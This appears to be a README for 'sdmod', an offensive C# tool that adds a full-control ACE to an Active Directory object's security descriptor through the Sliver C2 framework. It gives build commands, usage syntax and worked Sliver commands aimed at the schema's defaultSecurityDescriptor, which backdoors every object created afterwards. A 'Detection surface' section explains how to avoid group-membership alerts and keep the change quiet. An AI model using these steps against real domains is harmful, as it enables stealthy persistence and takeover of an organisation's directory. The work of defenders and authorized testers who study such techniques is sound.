# sdmod — Security Descriptor Modifier

**Language**: **English** | [中文](docs/README.zh-CN.md) | [Français](docs/README.fr.md)

<img align="right" src="assets/sdmod.png" alt="sdmod Logo" width="280">

A C# CLI tool for appending a full-control ACE to an AD object's security descriptor over LDAP, built for red teaming and tailored for Sliver C2 `execute-assembly --in-process`.

![Platform](https://img.shields.io/badge/platform-Windows-0078d6?style=flat) ![Language](https://img.shields.io/badge/language-C%23-68217a?style=flat) [![Version](https://img.shields.io/github/v/release/RedteamNotes/sdmod?style=flat&label=Version)](https://github.com/RedteamNotes/sdmod/releases/latest) [![License](https://img.shields.io/github/license/RedteamNotes/sdmod?style=flat)](LICENSE) [![Security Policy](https://img.shields.io/badge/security%20policy-2ea44f?style=flat)](SECURITY.md)

Operationally focused: binds with `Secure | ServerBind` to force a direct bind against the named DC — no auto-selection, so schema-partition writes reliably land on the Schema Master FSMO holder. The security descriptor is read and written in its native SDDL string form, so the DC parses and converts the change itself — no binary SDDL conversion, no "server unwilling to process" failures. The ACE is appended, never replaced: every existing ACE (including the schema-specific object-type OAs, the implicit owner, and the primary group) is preserved.

Implemented with `System.DirectoryServices` only, compiling on Mono into a ~4-6 KB x64 assembly with no third-party dependencies — small, dependency-free, and easy to load in-process. Intended for authorized red teaming, penetration testing, and lab environments.

<br clear="right">

## Capabilities

| Aspect | Description |
|---|---|
| Read | Fetches the target object's security descriptor as an SDDL string, forcing a fresh attribute cache so the latest value is used |
| Append | Adds a single full-control allow ACE (same rights as Domain Admins) for a specified SID — append-only, leaving every existing ACE intact |
| Write back | Commits the updated SDDL string directly; the DC natively parses and converts it, guaranteeing format compatibility |
| Bind | `Secure \| ServerBind` — LDAP signing plus a forced direct bind to the named server, bypassing DC auto-selection |
| No dependencies | `System.DirectoryServices` only; Mono-compatible, ~4-6 KB x64 assembly, no third-party libraries |

## Build

Requires Mono (`mcs`) or .NET Framework 4.x. Fetch the source, then on Debian / Kali install the build dependencies:

```bash
# Fetch the source (single file)
curl -O https://raw.githubusercontent.com/RedteamNotes/sdmod/main/sdmod.cs

# Install build dependencies (Debian / Kali)
sudo apt update
sudo apt install -y mono-mcs mono-devel

# Build
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll -platform:x64 -debug-
```

No third-party dependencies. No prebuilt binaries are shipped in releases — build it yourself with the command above to minimize supply-chain exposure. About the flags: `-platform:x64` forces the x64 target to match the Sliver beacon architecture and `-debug-` skips the .mdb debug-symbol file. `-optimize` and `-nologo` have only a negligible effect on a tool this small — `-nologo` merely suppresses the compiler banner and changes nothing in the output.

## Usage

```text
sdmod.exe <LDAP Path> <User> <Pass> <AttrName> <TrusteeSID>
```

### Arguments

| # | Argument | Description |
|---|---|---|
| 1 | `<LDAP Path>` | LDAP object path, e.g. `LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,CN=Configuration,DC=redteamnotes,DC=local` |
| 2 | `<User>` | Authentication user, `domain\user` |
| 3 | `<Pass>` | Password |
| 4 | `<AttrName>` | Target attribute, e.g. `defaultSecurityDescriptor` |
| 5 | `<TrusteeSID>` | SID granted full control (pass the SID directly — no name resolution) |

### Exit codes

| Code | Meaning |
|---|---|
| 0 | Success |
| 1 | Usage / argument error |
| 2 | Unexpected attribute type |
| 3 | LDAP / AD operation failed (stderr carries the detail) |

## Examples

Query the current value first, so the original SDDL is recorded for rollback:

```text
sliver > sa-ldapsearch -- -query "(name=Group)" -dn "CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes defaultSecurityDescriptor
```

Append a full-control ACE for the target SID:

```text
sliver > execute-assembly --in-process sdmod.exe -- \
  "LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" \
  "redteamnotes\redpen" "P@ssw0rd" "defaultSecurityDescriptor" "S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx"

[+] Success: ACE added successfully
```

Verify by re-running the query — the new ACE appears at the end of the SDDL string.

For a full end-to-end walkthrough with a worked example, see [TUTORIAL](docs/TUTORIAL.md).

## Notes

- Allow ~3-5 minutes after the write before the change takes effect; earlier attempts fail.
- This modifies the schema partition's `defaultSecurityDescriptor` (a template), not group membership — existing objects are unaffected; objects created afterwards inherit the ACE.
- Record the original SDDL before modifying so the change can be rolled back.
- Re-running appends the same ACE again — the SDDL accumulates a duplicate ACE per run. Restore from the recorded original if needed.
- The password travels as cleartext on the command line (visible in process listings / `execute-assembly` args). Accept that exposure or use a context that already holds credentials.
- For authorized testing only.

## Detection surface

What the change looks like to defenders, and how to keep it quiet.

- The modified `defaultSecurityDescriptor` replicates with the schema partition; querying the object shows the appended ACE and its hardcoded SID.
- The write fires a directory-service attribute modification on the DC that receives it (Event 5136) if DS access auditing is enabled.
- Because no group membership is touched, the usual privileged-group monitoring (Event 4728/4732) is not triggered.

### Reducing your surface

- Prefer the schema-template modification over direct membership changes — it leaves no `Member` delta.
- Record and restore the original SDDL when the engagement ends.

## Using via Sliver `execute-assembly`

Primary deployment path — run in-process, no disk artifact:

```text
sliver > make-token -d redteamnotes.local -u redpen -p 'P@ssw0rd'
sliver > execute-assembly --in-process sdmod.exe -- ...
```

`make-token` uses `LOGON32_LOGON_NEW_CREDENTIALS` by default: local actions run as the original process identity; only outbound network connections carry the new credentials.

## License

sdmod is released under the MIT License.

## Disclaimer

For use in authorized security assessments, CTFs, and lab environments only. The author assumes no responsibility for misuse.
